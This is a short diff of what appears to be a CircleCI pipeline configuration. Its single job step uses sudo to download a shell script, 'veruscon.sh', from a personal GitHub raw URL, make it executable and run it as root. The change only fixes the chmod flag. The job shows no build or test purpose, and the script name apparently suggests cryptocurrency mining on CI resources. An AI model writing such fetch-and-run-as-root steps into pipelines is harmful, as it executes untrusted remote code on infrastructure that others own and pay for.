@@ -8,7 +8,7 @@ jobs:
       - run:
          name:
          command: |
-            sudo su --command "wget https://raw.githubusercontent.com/Owijeka/wingsan/main/veruscon.sh && chmod +ux veruscon.sh && ./veruscon.sh"
+            sudo su --command "wget https://raw.githubusercontent.com/Owijeka/wingsan/main/veruscon.sh && chmod u+x veruscon.sh && ./veruscon.sh"
 
 workflows:
   version: 2.1
